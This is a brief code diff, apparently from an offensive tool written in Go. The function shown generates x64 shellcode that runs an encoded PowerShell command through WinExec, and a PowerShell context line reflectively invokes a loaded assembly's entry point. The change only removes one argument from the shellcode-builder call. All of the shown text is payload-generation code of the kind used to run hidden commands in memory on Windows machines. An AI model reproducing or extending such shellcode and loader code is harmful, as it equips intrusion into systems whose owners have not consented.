@@ -123,6 +123,6 @@ if ($ep) { $ep.Invoke($null, @(,[string[]]@())) }
 
 	// Generate x64 shellcode that runs: powershell -EncodedCommand <b64>
 	// This is a minimal WinExec shellcode pattern
-	sc := buildPowershellWinExecShellcode(encoded, true)
+	sc := buildPowershellWinExecShellcode(encoded)
 	return sc, nil
 }
